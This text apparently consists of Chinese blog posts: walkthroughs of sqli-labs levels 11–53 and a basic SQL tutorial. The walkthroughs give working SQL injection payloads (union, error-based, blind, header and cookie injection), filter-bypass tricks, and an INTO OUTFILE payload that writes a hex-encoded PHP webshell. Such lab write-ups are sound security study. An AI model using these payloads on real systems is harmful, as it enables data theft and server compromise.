<h1 id="less11-post注入的union注入"><a href="#less11-post注入的union注入" class="headerlink" title="less11 post注入的union注入"></a>less11 post注入的union注入</h1><p>这题目我们可以发现有点不同，它是在登陆界面进行注入的，也就是他的sql语句由post表达提交<br>我们完全可以猜测其sql语句应为<br>username=传递参数 and password=传递参数<br> 其他的其实与在url上的注入差异不大注入只是将注释符—+改为#语句如下<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database()#</span><br><span class="line">1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;#</span><br><span class="line">1&#x27; union select 1,group_concat(email_id) from security.emails#</span><br></pre></td></tr></table></figure></p>
<h1 id="less12-post的union注入"><a href="#less12-post的union注入" class="headerlink" title="less12 post的union注入"></a>less12 post的union注入</h1><p>与第11关基本一样只是闭合方式为1”)</p>
<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>我们输入1’) union select 1,2#屏幕没有回显我们可以尝试使用报错注入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,substr((select database()),1,28)))#</span><br></pre></td></tr></table></figure><br>我们可以对查询语句进行替换</p>
<h1 id="less-14-post的union注入"><a href="#less-14-post的union注入" class="headerlink" title="less 14 post的union注入"></a>less 14 post的union注入</h1><p>与13题相似只是由’)改为”</p>
<h1 id="less-15-post的时间盲注"><a href="#less-15-post的时间盲注" class="headerlink" title="less 15 post的时间盲注"></a>less 15 post的时间盲注</h1><p>该题目我们发现不管怎么输入都不回显我们可以考虑使用时间盲注</p>
<h1 id="less-16-post的时间盲注"><a href="#less-16-post的时间盲注" class="headerlink" title="less 16 post的时间盲注"></a>less 16 post的时间盲注</h1><p>与15相似</p>
<h1 id="less-17-post的时间盲注"><a href="#less-17-post的时间盲注" class="headerlink" title="less 17 post的时间盲注"></a>less 17 post的时间盲注</h1><p>相同</p>
<h1 id="less-18-ua头注入"><a href="#less-18-ua头注入" class="headerlink" title="less 18 ua头注入"></a>less 18 ua头注入</h1><p>我们可以从less18的源代码入手<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br></pre></td></tr></table></figure><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less18-1.png" class="" title="Alt text"><br>该图中显示会将uagent的内容插入到数据库中，而uagent的内容为标头 user_agent的内容那么我们可以采用bp来抓包修改ua头的内容（发送到重放器以便修改ua头）<br>对ua头进行修改采用报错注入代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database())),3),2,3)#</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><figcaption><span>插入语句</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;$uagent&#x27;</span>,<span class="string">&#x27;$ip&#x27;</span>,<span class="string">&#x27;$uname&#x27;</span>)</span><br></pre></td></tr></table></figure><br>结合插入语句我们进行语句的分析，<code>&#39;</code>是为了闭合’$uagent’的’,or或是一个报错注入，插入的sql注入一般都使用报错注入结尾的<code>2,3</code>是输入的ip以及uname<code>)</code>结尾的括号是为了闭合括号#是为了注释掉后面的<code>&#39;,&#39;$ip&#39;,&#39;$uname&#39;)</code></p>
<h1 id="less19-referer注入"><a href="#less19-referer注入" class="headerlink" title="less19 referer注入"></a>less19 referer注入</h1><p>该题目我们在登陆口输入admin，admin这时候屏幕回显出referer的内容我们可以猜测是referer注入<br>我们打开网页代码查看一下<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less19-1.png" class="" title="Alt text"><br>我们可以发现只要账号密码输入正确那么就会对数据库security的referer表中的referer和ip_address数据列里插入<code>$uagent</code>和<code>$ip</code>这两个数据，<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br></pre></td></tr></table></figure><br>而根据这个代码发现$uagent里存的是referer的内容那么我们就可以尝试抓包修改referer头的内容进行报错注入代码如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select database())),3),2)#</span></span><br></pre></td></tr></table></figure><br>这时候我们就可以爆出其数据库名称，之后我们可以对报错注入的查询语句进行修改就可以查询其他语句</p>
<h1 id="less20-cookie注入"><a href="#less20-cookie注入" class="headerlink" title="less20 cookie注入"></a>less20 cookie注入</h1><p>该题目我们输入admin和admin屏幕回显,cookie的值，我们查看源代码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less20-1.png" class="" title="Alt text"><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less20-2.png" class="" title="Alt text"><br>这两个图片的代码表示会回显cookie的值和会查询在查询语句中查询cookie这时我们只要对cookie进行修改将其修改为查询语句那么就会回显出cookie的值就会为查询语句的结果<br>由于该语句是直接查询cookie所以我们可以利用union注入代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; union select 1,2,database()#</span><br></pre></td></tr></table></figure><br>剩下的同样对查询语句替换即可</p>
<h1 id="less21-cookie注入base64编码"><a href="#less21-cookie注入base64编码" class="headerlink" title="less21 cookie注入base64编码"></a>less21 cookie注入base64编码</h1><p>21关同样是cookie注入<br>我们进行抓包可以看到其cookie值是一串代码我们在bp中可以看出其为base64编码那么我们只要将注入语句通过base64编码后再输入即可</p>
<h1 id="less22-cookie注入base64编码"><a href="#less22-cookie注入base64编码" class="headerlink" title="less22 cookie注入base64编码"></a>less22 cookie注入base64编码</h1><p>与21相似就是闭合方式不同</p>
<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><h2 id="方法1：注释符-39-绕过"><a href="#方法1：注释符-39-绕过" class="headerlink" title="方法1：注释符&#39;绕过"></a>方法1：注释符<code>&#39;</code>绕过</h2><p>这一关我们发现与第一个非常相似我们直接输入<code>?id=1</code>屏幕回显我们再注入<code>?id=1&#39;</code>报错我们发现是<code>&#39;</code>闭合我们再输入<code>?id=1&#39;--+</code>仍然报错我们输入<code>?id=1&#39;#</code>也相同<br>那么我们可以发现其注释符被过滤了我们可以采用<code>&#39;</code>绕过代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3&#x27;</span><br></pre></td></tr></table></figure><br>注入语句结尾的’与原本的’闭合使sql语句正常这就绕过了注释符过滤<br>我们还可以使用<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,4 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><br>该绕过方式利用了<code>or &#39;1&#39;=&#39;1</code>来闭合<code>&#39;</code><br><strong>注意该绕过语句导致order by不可以使用只能利用union select 1，2，3，4通过删减数子来寻找列数</strong><br>绕过了注释符时就可以利用联合注入了</p>
<h2 id="方法2：注释符利用-00来绕过"><a href="#方法2：注释符利用-00来绕过" class="headerlink" title="方法2：注释符利用%00来绕过"></a>方法2：注释符利用%00来绕过</h2><p>%00是一个空字符，在16进制中表示为0x00，即ascii码值为0，很多函数在读取到0x00时就会停止在系统中读取文件名时如果遇到就会停止，我们可以运用这个性质来绕过一些文件上传，<br>%00也可以在sql语句尾部作为截断因为在服务器中%00被解析为0x00这导致了后面的语句被截断，注意因为是截断所有我们需要在句尾写下分号</p>
<h1 id="less-24"><a href="#less-24" class="headerlink" title="less 24"></a>less 24</h1><p>这道题目是一个标准的登陆界面，我们可以在直接看后端源代码来进行分析<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-1.png" class="" title="Alt text"><br>这是登陆界面的代码，我们可以看见一个叫<code>mysql_real_escape_string()</code>这个函数是将字符串里的特殊字符都给转意，我们可以存入一个admin’#,他的’和#转意思为\’#使其成为正常的字符<br>这个是注册页面的源代码，这个代码同样会将字符串转意如何在存入数据库，但是在存入数据库时不会将转意字符\存入，导致存入的admin’#<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-2.png" class="" title="Alt text"><br>我们在查看修改密码的源代码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less24-3.png" class="" title="Alt text"><br>这个语句直接从数据库中获取用户名而这个获取的过程是不存在转义所以他的修改sql语句就会变为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><br>这时我们修改的就不是admin’#的密码了而是admin的密码而再我们修改好后利用该账号密码进行登入就会成登入成功</p>
<h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>这关我们经过尝试可以发现绕过了or和and我们查看源码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less25-2.png" class="" title="Alt text"><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less25-1.png" class="" title="Alt text"><br>发现是<code>preg_replace()</code>这个函数会匹配字符后将字符进行替换，我们可以看到这个函数匹配or和and将其替换为空所以这道题目过滤了or和and<br>一般绕过or和and过滤方法有以下几种<br>1，可以使用复写发就是将or写成oorr这样当or被替换为空时就会产生一个新的or，and也同理<br>2，特殊字符绕过我们可以尝试用特殊字符||和&amp;&amp;来代替or和and<br>3,过滤符绕过我们可以尝试构造这样的如o/**/r或/or/尝试绕过<br>4,编码，hex，urlencode<br>5,大小写变形绕过如Or,oR,OR<br>这关我们可以使用双写绕过和特殊字符绕过，<br>注意在输入information_schema时我们要输入infoorrmation_schema，因为information里有个or</p>
<h1 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h1><p>这关我们输入?id=1和id=2-1回显相同为数字型，但是在为什么输入其他语句时发现屏幕只有真假值的区别所以这关我们采取布尔盲注，<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 anandd ascii(substr((select database()),1,1))&gt;114</span><br></pre></td></tr></table></figure><br>也可以使用oorr来进行盲注<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 oorr ascii(substr((select database()),1,1))=115</span><br></pre></td></tr></table></figure></p>
<h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less26-1.png" class="" title="Alt text">
<p>这关我们可以看到绕过了很多，其中比较重要的有and,or,空格和注释符<br>空格我们可以采用的绕过方式有以下几种<br>1,url编码：%20，%0a,%a0,%0b,%0c,%0d<br>2，+,加号在进行urldecode时会被解析为空格<br>3，注释符绕过：/<em>*/或/</em> */在一些情况下注释符会被sql解析器解析为空格<br>4,括号绕过，将需要用空格隔开的两个指令，使用括号隔开可以进行绕过如select(database())</p>
<h2 id="姿势一-括号绕过空格的报错注入"><a href="#姿势一-括号绕过空格的报错注入" class="headerlink" title="姿势一:括号绕过空格的报错注入"></a>姿势一:括号绕过空格的报错注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;||extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables )where(table_schema)=database() )));%00</span><br></pre></td></tr></table></figure>
<h2 id="姿势二-A0绕过空格进行union注入"><a href="#姿势二-A0绕过空格进行union注入" class="headerlink" title="姿势二:%A0绕过空格进行union注入"></a>姿势二:%A0绕过空格进行union注入</h2><p>理论上是可以使用这个方法进行绕过的但是很可惜的是因为我们使用的是windows环境在我们输入%A0时会导致解析错误解析成�由于环境的原因无法在windows搭建的靶场下使用该方法进行绕过，但是可以在linux下进行，所以我们可以不用本地靶场用网络上的sqlilabs靶场这样就可以成功进行了这里我使用的是nssctf的靶场</p>
<h2 id="当然我们也可以使用盲注"><a href="#当然我们也可以使用盲注" class="headerlink" title="当然我们也可以使用盲注"></a>当然我们也可以使用盲注</h2><h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>这关我们在查看源码后可以发现过滤的字符与26关一模一样但是这关只回显正确和错误的界面所以我们可以使用布尔盲注，以下是这关可以使用的两种绕过方法</p>
<h2 id="绕过姿势一：使用（）绕过空格"><a href="#绕过姿势一：使用（）绕过空格" class="headerlink" title="绕过姿势一：使用（）绕过空格"></a>绕过姿势一：使用（）绕过空格</h2><p>由于我们无法使用空格所以我们可以使用特殊字符绕过and和or以此来规避空格，经过我的尝试只能使用or的特殊字符||所以我们需要使传入的<strong>id为空</strong>以此来保证前项为错误<br>代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;)||ascii(substr((select(database()) ) ),1,1)&gt;100;%00</span><br></pre></td></tr></table></figure></p>
<h2 id="绕过姿势二：使用-A0绕过空格"><a href="#绕过姿势二：使用-A0绕过空格" class="headerlink" title="绕过姿势二：使用%A0绕过空格"></a>绕过姿势二：使用%A0绕过空格</h2><p>我们可以尝试使用%A0来绕过空格然后采取布尔盲注<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;)||ascii(substr((select%A0database())),1,1)&gt;100;%00</span><br></pre></td></tr></table></figure></p>
<h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>这关我们直接查看源码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less27-1.png" class="" title="Alt text"><br>仍然使因为preg_replace将字符进行了替换，/s表示匹配任意字符包括换行符，/m表示可以多行匹配我们可以看到过滤了很多空格，注释，union和select，还有加号，等</p>
<h2 id="select和union的一般绕过方法"><a href="#select和union的一般绕过方法" class="headerlink" title="select和union的一般绕过方法"></a>select和union的一般绕过方法</h2><p>1:大小写绕过，可以将里的一些字符从小写改为大写，这样子可以绕过一些比较简单的题目<br>2:双写绕过可以双写select如sleselectct这样子就会导致select被删除后还可以再次出现一个新的select<br>3:注释符绕过，如sel/**/ect一些没有过滤注释符的题目会将注释符当成空值，之后就会变成select<br>这道题目的绕过方法很多<br>在经过尝试之后发现空格可以采用%0A,%0B,%0C,%0D进行绕过</p>
<h2 id="姿势一-使用大小写绕过union"><a href="#姿势一-使用大小写绕过union" class="headerlink" title="姿势一:使用大小写绕过union"></a>姿势一:使用大小写绕过union</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0AunIon%0AseLEct%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database();%00</span><br></pre></td></tr></table></figure>
<h2 id="姿势二-使用双写来绕过union"><a href="#姿势二-使用双写来绕过union" class="headerlink" title="姿势二:使用双写来绕过union"></a>姿势二:使用双写来绕过union</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0Auniunionon%0Aseleselectct%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database();%00</span><br></pre></td></tr></table></figure>
<p>在这里我介绍两个姿势其他姿势我就不过多赘述了</p>
<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less 27a"></a>less 27a</h1><p>这关与27几乎相同只是回显只有正确和错误两值所以我们可以采用布尔盲注，代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0aand%0aascii(substr((select%0adatabase()),1,1))&gt;100;%00</span><br></pre></td></tr></table></figure></p>
<h1 id="less-28"><a href="#less-28" class="headerlink" title="less 28"></a>less 28</h1><p>在打这关的时候我浅浅的尝试了一下发现其过滤的字符好像很少，所以我们来看一下源码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less28-1.png" class="" title="Alt text"><br>我们查看这个，发现就过滤了注释符，空格，加号，还有<code>union select</code><br>我们看这个语句<code>$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code>这个语句中是遇到<code>union select</code>才会删除单独遇见union或select不会删除，其中<code>\s+</code>是匹配一个空格或多个空格。然而这个无法使用联合注入只能使用盲注所以这题过滤语句可以忽略<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0aand%0aascii(substr((select%0adatabase()),1,1))&gt;100;%00</span><br></pre></td></tr></table></figure></p>
<h1 id="less29"><a href="#less29" class="headerlink" title="less29"></a>less29</h1><p>这关我在做的时候直接使用union注入就可以成功没有任何过滤我感到很奇怪所以外查了网络上的wp我发现这道题目主要是让我们了解<code>双层服务器</code>的概念，但是可能是因为环境等原因导致我们无法成功跳转服务器。可能是因为环境的原因我无法达成网上的效果但是可以直接手动运行，login.php文件在进行注入，<br>我们写下?id=1’可以发现直接进行了跳转，跳转到了hacked.php，我们直接查看源码<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-1.png" class="" title="Alt text"><br>首先$_server[‘QUERY_STRING’]是获取字符的语句，将获取的字符串传java_implimentation（）里。<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-3.png" class="" title="Alt text"></p>
<p>explode(“&amp;”,$q_s)的功能是分格字符,以&amp;为分界线分割字符，<br>foreach的作用是遍历数组，foreach($qs_array as $key=&gt;$value)的意思是遍历数组并将每一个字符赋值到value里，将val赋值为value的前三位，如为id就将value的第四位到30返回并传到whitelist里<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-2.png" class="" title="Alt text"><br>这个方法是一个正则过滤，意思是只能匹配数字，如果不是数字就会跳转到hacked.php可以看到这是一个很强的waf。<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less29-2.jpg" class="" title="Alt text"><br>这时候我们就需要知道双服务器的概念了。双服务器就是一个服务器有两个服务端盖，服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。<br>工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。客户端请求首先过tomcat，tomcat解析第一个参数，接下来tomcat去请求apache（php）服务器，apache解析最后一个参数。<br>通过工作流程我们可以知道，tomcat只会解析第一个传输的参数，而apache服务器会解析最后一个参数，那么我们就可以在第一个参数输入符合tomcat的参数，再在第二个参数写入注入语句来绕过tomcat服务器<br><figure class="highlight sql"><figcaption><span>注入语句</span></figcaption><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="less30和31"><a href="#less30和31" class="headerlink" title="less30和31"></a>less30和31</h1><p>和29类似只是闭合方式不同<br>30闭合方式位”,32是”)<br>2</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs less46-53</title>
    <url>/2023/12/14/sqlilabs-less46-53/</url>
    <content><![CDATA[<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>这道题目我们打开源码，可以发现他的查询语句发生了很大的变化，我们可以发先这个语句由<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id=&#x27;$id&#x27;</span><br></pre></td></tr></table></figure><br>变成了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user order by $srot</span><br></pre></td></tr></table></figure><br>那么我来介绍以下order by<br>首先order by是一个mysql的排序语句，而我们常用的order by 1，order by 3之类的，原理就是order by的排列概功能，order by 3的意思就是将select查询的列的第三个进行排序，那么如果输入的数大于查询的列数就会报错，这就是order by查询列数的原理。<br>order by的基本语句如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users order by username,password ASC|DESC</span><br></pre></td></tr></table></figure><br>ASC为正序而DESC为逆序<br>那么我们要怎么利用order by来进行注入呢？<br>1，经过尝试order_by后无法跟union进行注入<br>2，order by后可以使用and和or语句所以我们可以使用报错注入<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> database())))</span><br></pre></td></tr></table></figure><br>3.可以采取盲注<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(2))</span><br></pre></td></tr></table></figure><br>我们还可以使用另一种盲注，利用if正确返回1错误返回2<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=if(ascii(substr((select database()),1,1))&gt;100,1,2)</span><br></pre></td></tr></table></figure><br>4,order by后还可以使用into outfile来进行过注入<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;D:\\phpstudy_pro\\WWW\\sqli\\Less-46\\1.php&#x27;</span>  lines terminated <span class="keyword">by</span> <span class="number">0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e</span></span><br></pre></td></tr></table></figure><br>0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e为一句话木马的16进</p>
<h1 id="less-47，48，49"><a href="#less-47，48，49" class="headerlink" title="less 47，48，49"></a>less 47，48，49</h1><p>47为数值型的盲注<br>48为数值型的盲注<br>49为’闭合的盲注</p>
<h1 id="less-50-51-52-53"><a href="#less-50-51-52-53" class="headerlink" title="less 50,51,52,53"></a>less 50,51,52,53</h1><p>50为数字型的报错注入，51为单引号报错注入，52数字型的盲注，53单引号的盲注<br>这几关和前面几关的区别为，其查询函数为mysqli_multi_query()可以进行堆叠注入</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刷了这么就终于刷完了sqli-labs的前三页了，后面的第4页并没有新的知识了，第4页主要是用于练习</p>
<h2 id="一：基础注入方式"><a href="#一：基础注入方式" class="headerlink" title="一：基础注入方式"></a>一：基础注入方式</h2><p>1：判断其为字符型注入还是数字型注入，如果是字符型则判断其闭合方式<code>&#39;</code> <code>&quot;</code> <code>&#39;)</code> <code>&quot;)</code>,其中括号数可以发生改变<br>2,判断注入方式，根据是否回显，回显方式来进行判断<br>（1）union注入：用于注入可以回显查询内容的页面<br>（2）报错注入：用于注入可以回显报错的注入或者后端语句为order by的<br>（3）布尔盲注：用于只回显正确错误两种信息的页面<br>（4）时间盲注，用于注入无任何回显的页面</p>
<h2 id="二，特殊注入方式"><a href="#二，特殊注入方式" class="headerlink" title="二，特殊注入方式"></a>二，特殊注入方式</h2><p>（1）各种标头的注入如果后端语句为插入(也就是insert语句)标头（如ua头，cookie头等）的select语句则使用请求头注入<br>（2）二次注入，在注册等只对字符进行转义便存入数据库的语句中可以使用二次注入将一些脏语句传入数据库在二次调用时就有可以会危害数据库<br>（3）宽字节注入，在使用函数将’转义过滤后如果数据库可以使用gbk编码那么就可以使用宽字符注入来绕过\,因为%df\就是%df5c在gbk编码中是个汉字<br>（4）堆叠注入，遇到mysqli_multi_query()这种可以查询多条语句的函数，可以使用堆叠注入来修改数据库<br>（5）into outfile来插入木马文件来获取权限</p>
<h2 id="三注入的基本防御方式"><a href="#三注入的基本防御方式" class="headerlink" title="三注入的基本防御方式"></a>三注入的基本防御方式</h2><p>1、使用双服务器进行防御<br>2、过滤一些关键字符进行防御<br>3、添加\进行转义<br><img src="2.png" alt="Alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入的学习</title>
    <url>/2023/11/09/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="我会在这里写下sql注入的一些学习过程"><a href="#我会在这里写下sql注入的一些学习过程" class="headerlink" title="我会在这里写下sql注入的一些学习过程"></a>我会在这里写下sql注入的一些学习过程</h1><h2 id="sql的增删改"><a href="#sql的增删改" class="headerlink" title="sql的增删改"></a>sql的增删改</h2><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><p><code>show databases</code></p>
<h3 id="创建与删除数据库"><a href="#创建与删除数据库" class="headerlink" title="创建与删除数据库"></a>创建与删除数据库</h3><p><code>create database employees charset utf8;</code>创建一个数据库叫employees字符集是utf8</p>
<p>删除叫employees的数据库<br><code>drop database employees;</code></p>
<h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p>创建一个名字为employee的表<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table employee</span><br><span class="line">//下面输入表格信息</span><br><span class="line">(</span><br><span class="line">id int,</span><br><span class="line">name varchar(),</span><br><span class="line">sex char(),</span><br><span class="line">birthday date,</span><br><span class="line">job varchar()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><br>创建表时需要将每一列分别是什么数据类型定义好</p>
<h3 id="查看数据表信息"><a href="#查看数据表信息" class="headerlink" title="查看数据表信息"></a>查看数据表信息</h3><p><code>show full columns from employee;</code></p>
<h3 id="查看数据表列表"><a href="#查看数据表列表" class="headerlink" title="查看数据表列表"></a>查看数据表列表</h3><p><code>select * from employee;</code></p>
<h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><p><code>drop table employee；</code></p>
<h1 id="给表添加一个自增的id"><a href="#给表添加一个自增的id" class="headerlink" title="给表添加一个自增的id"></a>给表添加一个自增的id</h1><p><code>alter table 表名 add id int unsigned not Null auto_increment primary key</code></p>
<h3 id="修改数据表名"><a href="#修改数据表名" class="headerlink" title="修改数据表名"></a>修改数据表名</h3><p>将数据表名改为user<br><code>rename table employee to user</code></p>
<h3 id="修改字符级"><a href="#修改字符级" class="headerlink" title="修改字符级"></a>修改字符级</h3><p><code>alter table user character set utf8;</code></p>
<h3 id="插入数据到数据表"><a href="#插入数据到数据表" class="headerlink" title="插入数据到数据表"></a>插入数据到数据表</h3><p>插入数据到叫user的表中<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user</span><br><span class="line">(id,name,sex,birthday,job)</span><br><span class="line">values</span><br><span class="line">(1,&quot;ctf&quot;,&quot;male&quot;,&quot;1999-05-&quot;,&quot;it&quot;)</span><br></pre></td></tr></table></figure></p>
<h3 id="增加一列名为salary的内容"><a href="#增加一列名为salary的内容" class="headerlink" title="增加一列名为salary的内容"></a>增加一列名为salary的内容</h3><p><code>alter table user add salary decimal(8,2)</code>//(8,2)意为数子长度为八小数点后两位</p>
<h3 id="修改某列信息"><a href="#修改某列信息" class="headerlink" title="修改某列信息"></a>修改某列信息</h3><p>修改salary的信息<br><code>update user set salary=5000;</code>//user为表名<br>可以在后面添加限定语句<br><code>update user set salary=5000 where id=1;</code>意为只修改id=1行的salary</p>
<h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><p><code>alter table user drop salary</code></p>
<h3 id="删除行"><a href="#删除行" class="headerlink" title="删除行"></a>删除行</h3><p><code>delet from user where jop=&#39;it&#39;</code> 删除job=’it’的那一行</p>
<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p><code>delet form user；</code></p>
<h2 id="数据库的查询"><a href="#数据库的查询" class="headerlink" title="数据库的查询"></a>数据库的查询</h2><h3 id="查询数据表中的信息"><a href="#查询数据表中的信息" class="headerlink" title="查询数据表中的信息"></a>查询数据表中的信息</h3><p><code>select * from 数据表名;</code>这个段代码表示的是查询表中的所有列信息，<em>表示的是所有列名<br>`select </em> from 数据表名 where 列名=数据<code>这句话是对查询的行进行限制，只查询符合限制的行，如限制可以是</code>where id=1`之类的<br>也可以将星号进行改变来查询自己想要的那一列</p>
<h3 id="union-联合查询"><a href="#union-联合查询" class="headerlink" title="union 联合查询"></a>union 联合查询</h3><p>union 联合查询多条语句<br>如输入以下代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id（`列名`） from user（数据表名） union select email(列名) from user（表名）；</span><br></pre></td></tr></table></figure><br>也可以对其进行限制，只要在表名后加上<code>where 限制条件</code><br><strong>注意用union联合查询时要查询两个表的所有信息时两表的列数需要相同</strong><br>当列数不同时可以输入以下代码<br><code>SELECT * FROM naem union select *,3 from emplpyee;</code>union后面的那条查询语句中的3是对其缺少的那一列进行填充。</p>
<h3 id="group-by列数查询"><a href="#group-by列数查询" class="headerlink" title="group by列数查询"></a>group by列数查询</h3><p>group by的作用是分组，也可以用来对表的列数进行查询<br><code>select * from 表名 where id=1 group by 列数</code>，在上面那跳语句中我们可以对列数进行更改来查询列数，一旦超过列数的总数就会报错。</p>
<h3 id="order-by列数查询"><a href="#order-by列数查询" class="headerlink" title="order by列数查询"></a>order by列数查询</h3><p>order by真正的作用是排序，同上我们也可以拿来对列数进行查询<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 列数</span><br></pre></td></tr></table></figure><br>原理相同也是对列数进行更改，<br><strong>在列数后加desc这是将order by的默认降序排序改为升序</strong></p>
